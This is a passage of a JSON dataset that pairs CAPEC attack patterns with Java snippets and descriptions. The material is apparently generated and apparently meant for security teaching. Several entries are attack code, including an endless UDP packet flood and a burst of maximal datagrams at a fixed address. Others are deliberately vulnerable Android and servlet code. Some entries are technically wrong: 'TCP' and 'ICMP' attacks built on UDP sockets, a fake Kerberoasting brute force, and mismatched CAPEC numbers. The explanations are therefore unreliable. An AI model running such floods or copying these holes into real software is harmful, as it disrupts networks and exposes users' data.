        "capec_name": "SOAP Array Blowup",
        "code_snippet": "import javax.xml.parsers.DocumentBuilderFactory;\nimport javax.xml.parsers.DocumentBuilder;\nimport org.w3c.dom.Document;\nimport java.io.StringReader;\nimport javax.xml.parsers.ParserConfigurationException;\nimport org.xml.sax.InputSource;\nimport org.xml.sax.SAXException;\nimport java.io.IOException;\n\npublic class SOAPArrayBlowup {\n    public static void main(String[] args) {\n        String soapMessage = \"<soap:Envelope xmlns:soap=\\\"http://schemas.xmlsoap.org/soap/envelope/\\\"><soap:Body><ArrayOfStrings xmlns=\\\"http://tempuri.org/\\\"><string>1</string><string>2</string></ArrayOfStrings></soap:Body></soap:Envelope>\";\n        for (int i = 0; i < 1000000; i++) {\n            soapMessage = soapMessage.replace(\"</ArrayOfStrings>\", \"<string>\" + i + \"</string></ArrayOfStrings>\");\n        }\n        try {\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            DocumentBuilder builder = factory.newDocumentBuilder();\n            Document document = builder.parse(new InputSource(new StringReader(soapMessage)));\n            System.out.println(\"Parsed SOAP message successfully\");\n        } catch (ParserConfigurationException | SAXException | IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a SOAP Array Blowup attack. The code constructs a SOAP message with a large array declaration by repeatedly adding elements to the array. The SOAP message is then parsed using an XML parser. This can lead to memory exhaustion as the parser attempts to allocate space for the large number of array elements. The code highlights the vulnerability described in CAPEC-220, where an attacker can exploit the lack of resource allocation limits (CWE-770) and improper memory allocation control (CWE-1325) to exhaust the web service's memory resources."
    },
    {
        "capec_id": "494",
        "capec_name": "TCP Fragmentation",
        "code_snippet": "import java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class TCPFragmentationAttack {\n    public static void main(String[] args) throws IOException {\n        InetAddress targetAddress = InetAddress.getByName(\"192.168.1.1\");\n        int targetPort = 80;\n        DatagramSocket socket = new DatagramSocket();\n\n        // Fragment 1: TCP header without flags\n        byte[] fragment1 = new byte[20];\n        // Fill fragment1 with TCP header data (excluding flags)\n        // ...\n        DatagramPacket packet1 = new DatagramPacket(fragment1, fragment1.length, targetAddress, targetPort);\n        socket.send(packet1);\n\n        // Fragment 2: TCP flags\n        byte[] fragment2 = new byte[20];\n        // Fill fragment2 with TCP flags\n        // ...\n        DatagramPacket packet2 = new DatagramPacket(fragment2, fragment2.length, targetAddress, targetPort);\n        socket.send(packet2);\n\n        socket.close();\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of a TCP Fragmentation attack. The code sends two fragmented TCP packets to a target address. The first fragment contains the TCP header without the flags, and the second fragment contains the TCP flags. This fragmentation can potentially bypass network filtering rules that do not inspect the second fragment. The code also touches on CWE-770 (resource allocation without limits) by not imposing any restrictions on the number of fragments sent, CWE-404 (improper resource shutdown) by not ensuring proper resource release, and CWE-319 (cleartext transmission) by sending data without encryption."
    },
    {
        "capec_id": "495",
        "capec_name": "UDP Fragmentation",
        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.util.Arrays;\n\npublic class UDPFragmentationAttack {\n    public static void main(String[] args) throws Exception {\n        InetAddress targetAddress = InetAddress.getByName(\"192.168.1.1\");\n        int targetPort = 12345;\n        byte[] largeData = new byte[2000]; // Data larger than typical MTU\n        Arrays.fill(largeData, (byte) 0xAB); // Fill with dummy data\n\n        DatagramSocket socket = new DatagramSocket();\n        DatagramPacket packet = new DatagramPacket(largeData, largeData.length, targetAddress, targetPort);\n\n        // Send the large packet to force fragmentation\n        socket.send(packet);\n        System.out.println(\"Packet sent to \" + targetAddress + \":\" + targetPort);\n\n        // No throttling or resource limits\n        while (true) {\n            socket.send(packet);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a UDP Fragmentation attack. The code sends a large UDP packet (2000 bytes) to a target server, which forces IP fragmentation since the packet size exceeds the typical MTU of 1500 bytes. The code continuously sends these large packets in an infinite loop, consuming network bandwidth and potentially overwhelming the target server's CPU and memory resources. This example embodies CWE-770 (Allocation of Resources Without Limits or Throttling) by not imposing any restrictions on the number of packets sent, and CWE-406 (Insufficient Control of Network Message Volume) by not monitoring or controlling the volume of transmitted network traffic."
    },
    {
        "capec_id": "496",
        "capec_name": "ICMP Fragmentation",
        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class ICMPFragmentationAttack {\n    public static void main(String[] args) throws Exception {\n        InetAddress targetAddress = InetAddress.getByName(\"192.168.1.1\");\n        byte[] data = new byte[65507]; // Maximum size for a UDP packet\n        DatagramSocket socket = new DatagramSocket();\n\n        // Simulate sending fragmented ICMP packets\n        for (int i = 0; i < 10000; i++) { // CWE-770: No limit on the number of packets\n            DatagramPacket packet = new DatagramPacket(data, data.length, targetAddress, 7);\n            socket.send(packet);\n        }\n\n        socket.close(); // CWE-404: Improper resource shutdown\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of an ICMP Fragmentation attack. The code sends a large number of UDP packets to a target address, simulating the resource exhaustion aspect of the attack. The key points are:\n\n1. **CWE-770**: The loop sends 10,000 packets without any limit or throttling, which can overwhelm the target's resources.\n2. **CWE-404**: The DatagramSocket is closed at the end, but in a real-world scenario, improper handling or failure to release resources could exacerbate the attack's impact.\n\nThe code represents the main idea of the CAPEC by showing how an attacker can send a large number of packets to a target, potentially causing it to become non-responsive due to resource exhaustion."
    },
    {
        "capec_id": "497",
        "capec_name": "File Discovery",
        "code_snippet": "import java.io.File;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class FileDiscovery {\n    public static void main(String[] args) {\n        if (args.length < 1) {\n            System.out.println(\"Usage: java FileDiscovery <directory>\");\n            return;\n        }\n\n        String directoryPath = args[0];\n        File directory = new File(directoryPath);\n\n        if (!directory.isDirectory()) {\n            System.out.println(\"Provided path is not a directory.\");\n            return;\n        }\n\n        File[] files = directory.listFiles();\n        if (files != null) {\n            for (File file : files) {\n                if (file.isFile()) {\n                    try {\n                        String content = new String(Files.readAllBytes(Paths.get(file.getPath())));\n                        System.out.println(\"Discovered file: \" + file.getName());\n                        System.out.println(\"Content: \" + content);\n                    } catch (IOException e) {\n                        System.out.println(\"Error reading file: \" + file.getName());\n                    }\n                }\n            }\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic file discovery mechanism. It takes a directory path as an argument, lists all files in the directory, and reads their contents. This embodies the CAPEC 'File Discovery' by probing a directory to find and read files, potentially exposing sensitive information (CWE-200). The code does not enforce access control, potentially exposing access control list files (CWE-529). It also relies on user input for the directory path (CWE-73) and does not validate the file types or paths, which could lead to untrusted search paths (CWE-426) and reliance on file names or extensions (CWE-646)."
    },
    {
        "capec_id": "498",
        "capec_name": "Probe iOS Screenshots",
        "code_snippet": "import java.awt.image.BufferedImage;\nimport java.io.File;\nimport javax.imageio.ImageIO;\n\npublic class ScreenshotHandler {\n    public static void main(String[] args) {\n        try {\n            // Simulate taking a screenshot and saving it to a file\n            BufferedImage screenshot = new BufferedImage(200, 200, BufferedImage.TYPE_INT_ARGB);\n            File outputfile = new File(\"screenshot.png\");\n            ImageIO.write(screenshot, \"png\", outputfile);\n\n            // Simulate an adversary accessing the screenshot file\n            BufferedImage accessedScreenshot = ImageIO.read(new File(\"screenshot.png\"));\n            System.out.println(\"Screenshot accessed: \" + (accessedScreenshot != null));\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet simulates the creation and unauthorized access of a screenshot, embodying the main idea of CAPEC- Probe iOS Screenshots. The code creates a temporary screenshot and saves it to a file. It then simulates an adversary accessing this screenshot file, demonstrating the potential exposure of sensitive information. This example highlights CWE-359 (Exposure of Private Personal Information to an Unauthorized Actor) by showing how sensitive information can be accessed without proper authorization. The code also indirectly touches on CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) by not restricting access to the screenshot file."
    },
    {
        "capec_id": "499",
        "capec_name": "Android Intent Intercept",
        "code_snippet": "import android.content.BroadcastReceiver;\nimport android.content.Context;\nimport android.content.Intent;\nimport android.content.IntentFilter;\nimport android.util.Log;\n\npublic class VulnerableReceiver extends BroadcastReceiver {\n    @Override\n    public void onReceive(Context context, Intent intent) {\n        // CWE-925: Improper Verification of Intent by Broadcast Receiver\n        String action = intent.getAction();\n        if (action != null && action.equals(\"com.example.SENSITIVE_ACTION\")) {\n            // CWE-927: Use of Implicit Intent for Sensitive Communication\n            String sensitiveData = intent.getStringExtra(\"sensitiveData\");\n            if (sensitiveData != null) {\n                Log.d(\"VulnerableReceiver\", \"Received sensitive data: \" + sensitiveData);\n            }\n        }\n    }\n\n    public static void registerReceiver(Context context) {\n        IntentFilter filter = new IntentFilter();\n        filter.addAction(\"com.example.SENSITIVE_ACTION\");\n        // CWE-926: Improper Export of Android Application Components\n        context.registerReceiver(new VulnerableReceiver(), filter);\n    }\n}\n\n// Somewhere in the application\npublic class MainActivity extends AppCompatActivity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n        VulnerableReceiver.registerReceiver(this);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable Android BroadcastReceiver that embodies the main idea of the CAPEC 'Android Intent Intercept'. The BroadcastReceiver listens for an implicit intent with the action 'com.example.SENSITIVE_ACTION'. It does not verify the source of the intent (CWE-925), uses an implicit intent for sensitive communication (CWE-927), and improperly exports the receiver component (CWE-926). This allows a malicious application to intercept, modify, or block the intent, potentially leading to information disclosure or other attacks."
    },
    {
        "capec_id": "500",
        "capec_name": "WebView Injection",
        "code_snippet": "import android.app.Activity;\nimport android.os.Bundle;\nimport android.webkit.WebView;\nimport android.webkit.WebViewClient;\nimport android.webkit.JavascriptInterface;\n\npublic class MainActivity extends Activity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        WebView webView = findViewById(R.id.webview);\n        webView.getSettings().setJavaScriptEnabled(true);\n        webView.setWebViewClient(new WebViewClient());\n        webView.addJavascriptInterface(new WebAppInterface(), \"Android\");\n        webView.loadUrl(\"http://example.com\");\n    }\n\n    public class WebAppInterface {\n        @JavascriptInterface\n        public void showToast(String toast) {\n            // Dangerous method exposed to JavaScript\n            Toast.makeText(MainActivity.this, toast, Toast.LENGTH_SHORT).show();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable Android application that uses a WebView component to load a web page. The WebView is configured to enable JavaScript and exposes a dangerous method 'showToast' to the JavaScript context via the 'addJavascriptInterface' method. This method can be exploited by an adversary to inject malicious code into the web page, manipulate the DOM, and access sensitive information. The code snippet embodies the main idea of the CAPEC 'WebView Injection' and highlights related CWEs such as 'Exposed Dangerous Method or Function' (CWE-749) and 'Improper Verification of Source of a Communication Channel' (CWE-940)."
    },
    {
        "capec_id": "501",
        "capec_name": "Android Activity Hijack",
        "code_snippet": "import android.app.Activity;\nimport android.content.Intent;\nimport android.os.Bundle;\nimport android.util.Log;\n\npublic class MainActivity extends Activity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        // Implicit Intent to start a new activity\n        Intent intent = new Intent(\"com.example.TRUSTED_ACTIVITY\");\n        startActivity(intent);\n    }\n}\n\n// MaliciousActivity.java\nimport android.app.Activity;\nimport android.os.Bundle;\nimport android.util.Log;\n\npublic class MaliciousActivity extends Activity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_malicious);\n\n        // Mimic the trusted activity's UI\n        Log.d(\"MaliciousActivity\", \"Mimicking trusted activity UI\");\n    }\n\n    // Method to capture sensitive data\n    private void captureSensitiveData() {\n        // Code to capture sensitive data\n        Log.d(\"MaliciousActivity\", \"Capturing sensitive data\");\n    }\n}",
        "description": "The provided code snippet demonstrates a scenario where an Android application uses an implicit intent to start a trusted activity. However, due to the use of an implicit intent, a malicious activity can intercept and hijack the intent, launching itself instead of the trusted activity. The malicious activity then mimics the trusted activity's user interface to deceive the user into entering sensitive data. This code embodies the main idea of the CAPEC 'Android Activity Hijack' and highlights the related CWEs, such as the use of implicit intents (CWE-927) and improper verification of the communication channel (CWE-940)."
    },
    {
        "capec_id": "502",
        "capec_name": "Intent Spoof",
        "code_snippet": "import android.content.BroadcastReceiver;\nimport android.content.Context;\nimport android.content.Intent;\nimport android.util.Log;\n\npublic class VulnerableReceiver extends BroadcastReceiver {\n    @Override\n    public void onReceive(Context context, Intent intent) {\n        // CWE-925: Improper Verification of Intent by Broadcast Receiver\n        String action = intent.getAction();\n        if (action != null && action.equals(\"com.example.TRUSTED_ACTION\")) {\n            // CWE-284: Improper Access Control\n            String sensitiveData = intent.getStringExtra(\"sensitiveData\");\n            Log.d(\"VulnerableReceiver\", \"Received sensitive data: \" + sensitiveData);\n        }\n    }\n}\n\n// CWE-926: Improper Export of Android Application Components\n// AndroidManifest.xml\n// <receiver android:exported=\"true\" android:name=\".VulnerableReceiver\">\n//     <intent-filter>\n//         <action android:name=\"com.example.TRUSTED_ACTION\" />\n//     </intent-filter>\n// </receiver>",
        "description": "This Java code snippet demonstrates a vulnerable Android BroadcastReceiver that improperly verifies the source of an Intent (CWE-925) and is improperly exported (CWE-926). The BroadcastReceiver listens for an Intent with the action 'com.example.TRUSTED_ACTION' and logs sensitive data received from the Intent without verifying the sender. This represents the main idea of the CAPEC 'Intent Spoof', where an adversary can exploit these weaknesses to send malicious Intents to the BroadcastReceiver, potentially leading to data modification, information disclosure, or data injection."
    },
    {
        "capec_id": "503",
        "capec_name": "WebView Exposure",
        "code_snippet": "import android.app.Activity;\nimport android.os.Bundle;\nimport android.webkit.WebSettings;\nimport android.webkit.WebView;\nimport android.webkit.JavascriptInterface;\n\npublic class MainActivity extends Activity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        WebView myWebView = findViewById(R.id.webview);\n        WebSettings webSettings = myWebView.getSettings();\n        webSettings.setJavaScriptEnabled(true);\n\n        myWebView.addJavascriptInterface(new WebAppInterface(this), \"AndroidInterface\");\n        myWebView.loadUrl(\"file:///android_asset/sample.html\");\n    }\n\n    public class WebAppInterface {\n        Activity mActivity;\n\n        WebAppInterface(Activity activity) {\n            mActivity = activity;\n        }\n\n        @JavascriptInterface\n        public void showToast(String toast) {\n            Toast.makeText(mActivity, toast, Toast.LENGTH_SHORT).show();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable implementation of a WebView in an Android application. The WebView is configured to enable JavaScript and an interface is registered using the addJavascriptInterface method. The interface, 'AndroidInterface', exposes a method 'showToast' that can be called from any loaded web page. This setup can be exploited by a malicious web page to access application-specific functionality, leading to potential security risks such as improper access control (CWE-284), exposed dangerous methods (CWE-749), and cross-site scripting (CWE-79). The code represents the main idea of the CAPEC by showing how an adversary can leverage the WebView's addJavascriptInterface API to access and misuse application functionality."
    },
    {
        "capec_id": "504",
        "capec_name": "Task Impersonation",
        "code_snippet": "import javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\nimport java.io.PrintWriter;\n\npublic class TaskImpersonationServlet extends HttpServlet {\n    @Override\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String task = request.getParameter(\"task\");\n        if (task == null) {\n            response.sendError(HttpServletResponse.SC_BAD_REQUEST, \"Task parameter is missing\");\n            return;\n        }\n\n        // CWE-285: Improper Authorization\n        if (!isAuthorized(request)) {\n            response.sendError(HttpServletResponse.SC_FORBIDDEN, \"Unauthorized access\");\n            return;\n        }\n\n        // CWE-506: Embedded Malicious Code\n        if (task.equals(\"maliciousTask\")) {\n            executeMaliciousTask(response);\n            return;\n        }\n\n        // Normal task execution\n        executeTask(task, response);\n    }\n\n    private boolean isAuthorized(HttpServletRequest request) {\n        // Simulate an improper authorization check\n        return \"authorizedUser\".equals(request.getParameter(\"user\"));\n    }\n\n    private void executeMaliciousTask(HttpServletResponse response) throws IOException {\n        PrintWriter out = response.getWriter();\n        out.println(\"<html><body><h1>Malicious Task Executed</h1></body></html>\");\n    }\n\n    private void executeTask(String task, HttpServletResponse response) throws IOException {\n        PrintWriter out = response.getWriter();\n        out.println(\"<html><body><h1>Task \" + task + \" Executed</h1></body></html>\");\n    }\n}",
        "description": "This Java servlet code demonstrates a scenario where an adversary can impersonate a task to execute malicious actions. The code includes an improper authorization check (CWE-285) that can be easily bypassed, allowing unauthorized users to access the servlet. Additionally, it contains a method to execute a malicious task (CWE-506), which simulates the execution of harmful code. The servlet takes a 'task' parameter from the request and performs different actions based on its value, highlighting the risk of task impersonation and the potential for embedded malicious code."
    },
    {
        "capec_id": "505",
        "capec_name": "Scheme Squatting",
        "code_snippet": "import java.net.URI;\nimport java.net.URISyntaxException;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class MaliciousApp {\n    private static Map<String, String> registeredSchemes = new HashMap<>();\n\n    public static void main(String[] args) {\n        // Register a URL scheme intended for a target application\n        registerScheme(\"targetapp\", \"http://maliciousapp.com\");\n\n        // Simulate receiving a URL intended for the target application\n        handleURL(\"targetapp://login?username=user&password=pass\");\n    }\n\n    public static void registerScheme(String scheme, String handler) {\n        registeredSchemes.put(scheme, handler);\n    }\n\n    public static void handleURL(String url) {\n        try {\n            URI uri = new URI(url);\n            String scheme = uri.getScheme();\n            if (registeredSchemes.containsKey(scheme)) {\n                // Redirect to the malicious handler\n                String handler = registeredSchemes.get(scheme);\n                System.out.println(\"Redirecting to: \" + handler);\n\n                // Mimic the target application login screen\n                mimicLoginScreen(uri);\n            } else {\n                System.out.println(\"No handler registered for scheme: \" + scheme);\n            }\n        } catch (URISyntaxException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void mimicLoginScreen(URI uri) {\n        // Extract sensitive information from the URL\n        String query = uri.getQuery();\n        System.out.println(\"Mimicking login screen with query: \" + query);\n\n        // Here, the malicious app would display a fake login screen\n        // and capture the user's credentials\n    }\n}",
        "description": "This Java code snippet demonstrates a 'Scheme Squatting' attack. The malicious application registers a URL scheme ('targetapp') intended for a target application that is not installed. When a URL with this scheme is received, the malicious application handles it by redirecting to a malicious handler and mimicking the target application's login screen to capture sensitive information. This example also touches on related CWEs: CWE-939 (Improper Authorization in Handler for Custom URL Scheme) by not restricting which actors can invoke the handler, CWE-598 (Use of GET Request Method With Sensitive Query Strings) by including sensitive information in the query string, and CWE-601 (URL Redirection to Untrusted Site) by redirecting to a malicious site."
    },
    {
        "capec_id": "506",
        "capec_name": "Tapjacking",
        "code_snippet": "import android.app.Activity;\nimport android.os.Bundle;\nimport android.view.View;\nimport android.widget.Button;\nimport android.widget.FrameLayout;\nimport android.widget.LinearLayout;\nimport android.widget.TextView;\n\npublic class TapjackingActivity extends Activity {\n    @Override\n    protected void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n\n        // Create a malicious overlay\n        FrameLayout overlay = new FrameLayout(this);\n        overlay.setLayoutParams(new FrameLayout.LayoutParams(\n                FrameLayout.LayoutParams.MATCH_PARENT,\n                FrameLayout.LayoutParams.MATCH_PARENT\n        ));\n        overlay.setBackgroundColor(0x80000000); // Semi-transparent overlay\n\n        // Add a button that appears to be part of the underlying app\n        Button maliciousButton = new Button(this);\n        maliciousButton.setText(\"Click Me\");\n        maliciousButton.setLayoutParams(new FrameLayout.LayoutParams(\n                FrameLayout.LayoutParams.WRAP_CONTENT,\n                FrameLayout.LayoutParams.WRAP_CONTENT\n        ));\n        overlay.addView(maliciousButton);\n\n        // Add the overlay to the current view\n        addContentView(overlay, new FrameLayout.LayoutParams(\n                FrameLayout.LayoutParams.MATCH_PARENT,\n                FrameLayout.LayoutParams.MATCH_PARENT\n        ));\n\n        // Set up the malicious button's click listener\n        maliciousButton.setOnClickListener(new View.OnClickListener() {\n            @Override\n            public void onClick(View v) {\n                // Perform a malicious action\n                // For example, navigate to a phishing URL\n                // Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse(\"http://malicious.example.com\"));\n                // startActivity(intent);\n            }\n        });\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of a tapjacking attack in an Android application. The code creates a semi-transparent overlay with a button that appears to be part of the underlying application. When the user taps the button, it can trigger a malicious action, such as navigating to a phishing URL. This example embodies the main idea of the CAPEC by misleading the user into interacting with a malicious interface. The related CWEs are represented as follows: CWE-1021 (Improper Restriction of Rendered UI Layers or Frames) is shown by the overlay that allows taps to pass through, CWE-451 (User Interface (UI) Misrepresentation of Critical Information) is demonstrated by the button that misleads the user, and CWE-939 (Improper Authorization in Handler for Custom URL Scheme) is hinted at in the commented-out malicious action."
    },
    {
        "capec_id": "507",
        "capec_name": "Physical Theft",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class SensitiveDataStorage {\n    public static void main(String[] args) {\n        String sensitiveData = \"UserPassword123\";\n        File file = new File(\"/tmp/sensitive_data.txt\");\n        try (FileWriter writer = new FileWriter(file)) {\n            writer.write(sensitiveData);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the improper storage of sensitive information, which is vulnerable to physical theft. The code writes sensitive data (a password) to a file located in the /tmp directory without any access control mechanisms. This embodies the CAPEC concept of 'Physical Theft' by showing how an adversary with physical access to the system can easily retrieve sensitive information. The code is vulnerable to CWE-1263 (Improper Physical Access Control), CWE-922 (Insecure Storage of Sensitive Information), and CWE-921 (Storage of Sensitive Data in a Mechanism without Access Control). An attacker with physical access to the system can simply read the file and obtain the sensitive data."
    },
    {
        "capec_id": "508",
        "capec_name": "Shoulder Surfing",
        "code_snippet": "import java.util.Scanner;\n\npublic class ShoulderSurfingExample {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter your password: \");\n        String password = scanner.nextLine();\n        \n        // Simulate sensitive information exposure\n        System.out.println(\"Your password is: \" + password);\n        \n        // Cleartext transmission of sensitive information\n        sendPasswordOverNetwork(password);\n    }\n    \n    private static void sendPasswordOverNetwork(String password) {\n        // Simulate sending password in cleartext\n        System.out.println(\"Sending password over network: \" + password);\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario vulnerable to shoulder surfing and related weaknesses. The program prompts the user to enter a password, which is then displayed on the console, exposing it to anyone who might be looking over the user's shoulder (CWE-200, CWE-359). Additionally, the password is transmitted in cleartext over a simulated network connection (CWE-319), further exposing it to potential unauthorized actors. This example highlights the risks of exposing sensitive information through inadequate handling and transmission practices."
    },
    {
        "capec_id": "509",
        "capec_name": "Kerberoasting",
        "code_snippet": "import java.io.FileOutputStream;\nimport java.io.IOException;\nimport java.security.MessageDigest;\nimport java.security.NoSuchAlgorithmException;\nimport java.util.Base64;\n\npublic class KerberoastingExample {\n    public static void main(String[] args) throws NoSuchAlgorithmException, IOException {\n        // Simulate obtaining a service ticket (TGS) encrypted with RC4\n        String serviceTicket = \"fakeEncryptedServiceTicket\";\n\n        // Save the ticket to disk (vulnerable practice)\n        try (FileOutputStream fos = new FileOutputStream(\"serviceTicket.bin\")) {\n            fos.write(serviceTicket.getBytes());\n        }\n\n        // Simulate brute-forcing the hashed value\n        String crackedPassword = bruteForceRC4(serviceTicket);\n        System.out.println(\"Cracked Password: \" + crackedPassword);\n    }\n\n    private static String bruteForceRC4(String encryptedTicket) throws NoSuchAlgorithmException {\n        // This is a placeholder for the actual brute force logic\n        // In reality, this would involve trying many keys until the correct one is found\n        MessageDigest md = MessageDigest.getInstance(\"MD5\");\n        byte[] hash = md.digest(encryptedTicket.getBytes());\n        return Base64.getEncoder().encodeToString(hash);\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of a Kerberoasting attack. The code simulates obtaining a service ticket encrypted with RC4, saving it to disk (which is a vulnerable practice), and then attempting to brute-force the hashed value to reveal the target account credentials. The code embodies the main idea of CAPEC-169 (Kerberoasting) and highlights related CWEs such as CWE-522 (Insufficiently Protected Credentials) by saving the ticket to disk insecurely, CWE-308 (Use of Single-factor Authentication) by relying on a single factor for authentication, and CWE-521 (Weak Password Requirements) by implying the possibility of weak passwords being brute-forced."
    },
    {
        "capec_id": "510",
        "capec_name": "SaaS User Request Forgery",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport javax.servlet.http.HttpSession;\n\n@WebServlet(\"/vulnerableEndpoint\")\npublic class VulnerableServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        HttpSession session = request.getSession(false);\n        if (session != null && session.getAttribute(\"user\") != null) {\n            String action = request.getParameter(\"action\");\n            if (action != null) {\n                // No proper origin validation\n                // No proper authorization check\n                performAction(action, session.getAttribute(\"user\"));\n            }\n        } else {\n            response.sendError(HttpServletResponse.SC_UNAUTHORIZED, \"User not authenticated\");\n        }\n    }\n\n    private void performAction(String action, Object user) {\n        // Simulate action execution\n        System.out.println(\"Action: \" + action + \" performed by user: \" + user);\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerability related to SaaS User Request Forgery. The servlet processes POST requests and performs actions based on the 'action' parameter. It checks if a session exists and if a user is authenticated, but it lacks proper origin validation and authorization checks. This allows an attacker to exploit the authenticated session of a trusted user to perform unauthorized actions on a SaaS application. The code embodies CWE-346 (Origin Validation Error) and CWE-285 (Improper Authorization) by not verifying the source of the request and not correctly performing authorization checks."
    },
    {
        "capec_id": "511",
        "capec_name": "Infiltration of Software Development Environment",
        "code_snippet": "import java.io.*;\n\npublic class MaliciousIDEInfiltration {\n    public static void main(String[] args) {\n        try {\n            // CWE-434: Unrestricted upload of file with dangerous type\n            File maliciousFile = new File(\"/path/to/malicious/file.jar\");\n            if (maliciousFile.exists()) {\n                // CWE-506: Embedded malicious code\n                ProcessBuilder pb = new ProcessBuilder(\"java\", \"-jar\", maliciousFile.getAbsolutePath());\n                Process process = pb.start();\n                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n                String line;\n                while ((line = reader.readLine()) != null) {\n                    // CWE-497: Exposure of sensitive system information to an unauthorized control sphere\n                    System.out.println(line);\n                }\n                process.waitFor();\n            }\n        } catch (IOException | InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n\n    // CWE-215: Insertion of sensitive information into debugging code\n    private static void debugSensitiveInfo(String info) {\n        System.out.println(\"Debug Info: \" + info); // CWE-200: Exposure of sensitive information to an unauthorized actor\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an attacker infiltrates an IDE environment by uploading a malicious JAR file (CWE-434). The malicious file is then executed, potentially containing embedded malicious code (CWE-506). The code reads the output of the malicious process, which could expose sensitive system information (CWE-497). Additionally, there is a method that inserts sensitive information into debugging output (CWE-215), which could expose this information to unauthorized actors (CWE-200). This snippet embodies the main idea of CAPEC-117, where an attacker infiltrates a software development environment to implant malware, exfiltrate sensitive data, and manipulate information."
    },
    {
        "capec_id": "516",
        "capec_name": "Hardware Component Substitution During Baselining",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class HardwareComponentSubstitution {\n    private static final Map<String, String> baselineComponents = new HashMap<>();\n    private static final Map<String, String> deployedComponents = new HashMap<>();\n\n    static {\n        // Baseline components\n        baselineComponents.put(\"CPU\", \"TrustedCPU\");\n        baselineComponents.put(\"Memory\", \"TrustedMemory\");\n        baselineComponents.put(\"Storage\", \"TrustedStorage\");\n\n        // Deployed components (malicious substitution)\n        deployedComponents.put(\"CPU\", \"MaliciousCPU\");\n        deployedComponents.put(\"Memory\", \"TrustedMemory\");\n        deployedComponents.put(\"Storage\", \"TrustedStorage\");\n    }\n\n    public static void main(String[] args) {\n        // Simulate the product development phase\n        System.out.println(\"Baseline Components: \" + baselineComponents);\n\n        // Simulate the deployment phase with substituted components\n        System.out.println(\"Deployed Components: \" + deployedComponents);\n\n        // Check for component substitution\n        for (String key : baselineComponents.keySet()) {\n            if (!baselineComponents.get(key).equals(deployedComponents.get(key))) {\n                System.out.println(\"Warning: Component substitution detected for \" + key);\n            }\n        }\n    }\n}",
        "description": "This Java code snippet simulates the scenario described in the CAPEC 'Hardware Component Substitution During Baselining'. It defines two sets of components: 'baselineComponents' representing the trusted components during the product development phase, and 'deployedComponents' representing the components in the final deployed product. The deployed components include a malicious substitution for the CPU. The code then checks for any discrepancies between the baseline and deployed components, printing a warning if a substitution is detected. This example highlights the risk of relying on potentially vulnerable or untrustworthy components (CWE-1357) and the importance of ensuring the integrity of hardware components throughout the product lifecycle."
    },
    {
        "capec_id": "517",
        "capec_name": "Documentation Alteration to Circumvent Dial-down",
